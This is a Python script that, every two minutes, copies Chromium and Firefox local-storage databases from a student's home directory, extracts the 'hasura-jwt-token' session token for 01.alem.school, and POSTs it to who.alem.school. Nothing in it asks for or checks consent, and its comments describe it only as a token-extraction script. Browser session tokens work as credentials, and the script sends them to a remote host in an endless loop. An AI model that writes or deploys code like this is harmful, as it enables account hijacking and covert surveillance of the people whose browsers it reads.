# az 01.17.2020 alem
# simple script to extract hasura-jwt token from firefox or chrome browsers
#
# Человечеству, обреченное на одиночество, не суждено появиться на свет дважды
#
import sqlite3
import plyvel
import time
import subprocess
import sys
import http.client
from time import gmtime, strftime

def getTime():
    return strftime("%Y-%m-%d %H:%M:%S", gmtime())

class Logger:
    # chrome == 1; firefox == 2, both == 3, none == 0
    status = 0
    chrome_path = "/home/student/.config/chromium/Default/Local Storage/leveldb"
    firefox_path = ""
    chrome_tmp_path = "./"
    firefox_tmp_path = "./firefox"
    service_url = "who.alem.school"

    def __init__(self):
        pass

    def remove_old_dirs(self, arg):
        out = subprocess.run(['rm', '-rf', arg], stdout=subprocess.PIPE)
        # print(out)

    def find_firefox_path(self):
        #
        # find path for firefox localstorage data
        #
        out = subprocess.run(['find', '/home/student/.mozilla/firefox', '-name', 'webappsstore*'], stdout=subprocess.PIPE)
        if out.returncode != 0:
            return(-1)

        o = out.stdout.decode('utf-8')
        res = o.split()
        print("[find_firefox_path]", res)
        if len(res) > 0:
            for i in res:
                if i.split('/')[-1] == "webappsstore.sqlite":
                    self.firefox_path = i

    def cp(self, src, dst):
        #
        # copy recursive from src to dst
        #
        cmd = ['cp', '-r', src, dst]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        proc.communicate()
        # print(outs, errs)
        code = proc.returncode
        if code != 0:
            print("{0} [ERROR] [cp] [{1}] [{2}] [{3}]".format(getTime(), code, src, dst))
            return(-1)

    def update_status(self):
        #
        # update current status
        # status == 0
        #   none of browsers exist
        # status == 1
        #   chrome
        # status == 2
        #   firefox
        # status == 3
        #   chrome && firefox
        #
        self.remove_old_dirs(self.chrome_tmp_path + "leveldb")
        self.remove_old_dirs(self.firefox_tmp_path)
        if self.find_firefox_path() == -1:
            status = 0
            print("{0} [ERROR] [find_firefox_path] [{1}]".format(getTime(), -1))
            return
        if self.cp(self.chrome_path, self.chrome_tmp_path) != -1:
            self.status = 1
        if self.cp(self.firefox_path, self.firefox_tmp_path) != -1:
            if self.status == 1:
                self.status = 3
            else:
                self.status = 2

    def send_data(self, argument, s):
        #
        # send data to who.alem.school
        #
        if not argument:
            print("[ERROR] [send_data] [cant find JWT] {0}".format(s))
            return
        
        #print(argument, s)

        try:
            conn = http.client.HTTPSConnection(self.service_url)
            conn.request("POST", "/", argument, {'Content-Type': 'application/json'})
            r = conn.getresponse()
            print("[send_data] [browser: {0}] [ok]".format(s))
        except Exception as e:
            print("[send_data] [browser: {0}]".format(s), e)


    def parse_data(self):
        #
        # updates status
        # takes jwt
        # send to who.alem.school
        #
        self.update_status()
        if self.status == 1 or self.status == 3:
            self.send_data(self.get_chrome_token(), "chrome")
        if self.status == 2 or self.status == 3:
            self.send_data(self.get_firefox_token(), "firefox")
        else:
            print("{} [ERROR] [parse_data] [CP ERROR]".format(getTime()))


    def get_firefox_token(self):
        #
        # take firefox token from sqlite localstorage file
        #
        # /home/az/.mozilla/firefox/4jzok1j3.default-release/webappsstore.sqlite
        conn = sqlite3.connect(self.firefox_tmp_path)
        try:
            c = conn.cursor()
            for row in c.execute("select * from webappsstore2 where key = 'hasura-jwt-token'"):
                # print(row[4])
                return row[4]
        except sqlite3.Error as e:
            print("{0} [ERROR] [get_firefox_token] [{1}]".format(getTime(), e))

    def get_chrome_token(self):
        #
        # take localstorage hasura-jwt-token (01.alem.school) from chrome leveldb
        #

        # sudo rm /home/az/.config/google-chrome/Default/Local\ Storage/leveldb/LOCK 
        # db = plyvel.DB('/home/az/.config/google-chrome/Default/Local Storage/leveldb')
        try:
            db = plyvel.DB(self.chrome_tmp_path + "leveldb")
            for key, value in db:
                if key == b'_https://01.alem.school\x00\x01hasura-jwt-token':
                    # print("{0} : {1}".format(key, value))
                    # print(value.decode('utf-8'))
                    # print(value)
                    return value.decode('utf-8')[1:]

        except plyvel.Error as e:
            print("{0} [ERROR] [get_chrome_token] [{1}]".format(getTime(), e))


# time to sleep

sleep_interval = 120

logger = Logger()
while True:
    logger.parse_data()
    time.sleep(sleep_interval)